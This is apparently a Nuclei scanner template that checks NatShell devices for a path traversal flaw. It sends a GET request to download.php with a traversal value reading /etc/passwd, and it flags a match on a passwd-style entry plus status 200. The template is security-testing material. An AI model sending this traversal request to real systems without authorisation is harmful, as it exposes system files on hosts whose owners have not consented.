id: natshell-path-traversal
info:
  author: pikpikcu
  name: NatShell Path Traversal
  reference: https://mp.weixin.qq.com/s/g4YNI6UBqIQcKL0TRkKWlw
  severity: high
  tags: natshell,lfi
requests:
- matchers:
  - regex:
    - toor:[x*]:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/download.php?file=../../../../../etc/passwd'
